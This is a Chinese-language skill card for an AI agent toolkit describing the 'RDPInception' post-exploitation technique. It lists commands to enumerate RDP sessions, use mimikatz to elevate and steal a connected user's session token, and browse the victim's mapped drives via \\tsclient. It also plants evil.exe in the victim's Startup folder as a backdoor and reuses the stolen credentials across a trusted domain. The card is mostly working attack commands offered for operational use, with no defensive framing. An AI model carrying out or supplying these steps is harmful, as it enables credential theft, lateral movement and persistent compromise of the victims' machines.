---
name: 'rdp-inception'
description: 'RDPInception：注入RDP会话→窃取用户凭据/跨域访问。RDP用户挂载的驱动器可植入后门。'
disable-model-invocation: true
metadata: { domain: ad-win, tier: T3 }
---
> 📌 DSH 用法：按卡名用 skill 工具加载；长任务用 bash 后台任务、并行侦察用 subagent。

## RDPInception / RDP Sessions Abuse

### 原理
已有 shell 在机器 A → 域/外部用户 RDP 到此机器 → 攻击者注入 RDP 会话进程 → 以 RDP 用户的身份在有权限的网络/域中操作。

### 利用
```powershell
# 1. 检测 RDP 会话
query user
qwinsta

# 2. 如果有高权限用户 RDP 进来 → 注入其进程
# 2a. 通过进程列表找到 RDP 用户的进程（如 explorer.exe）
tasklist /v | findstr "explorer"

# 2b. 注入
mimikatz.exe "token::elevate" "ts::sessions" "exit"
# → 找到目标 session → 窃取 token

# 3. 如果 RDP 用户挂载了本地驱动器 → 访问其文件
# 挂载点: \\tsclient\C\...
dir \\tsclient\C\Users\<victim>\Desktop

# 4. 在 RDP 用户挂载的驱动器中植入后门
copy evil.exe \\tsclient\C\Users\<victim>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\evil.exe
```text

### 跨域场景
- 用户在受信域（trusted domain）RDP 到当前域
- 注入其会话 → 用其凭据访问受信域资源

### 检测
```text
[ ] query user → 是否有来自其他域的用户？
[ ] tasklist → 是否有 mount 的 RDP 驱动器？
[ ] 检查 \\tsclient 是否可访问
```text
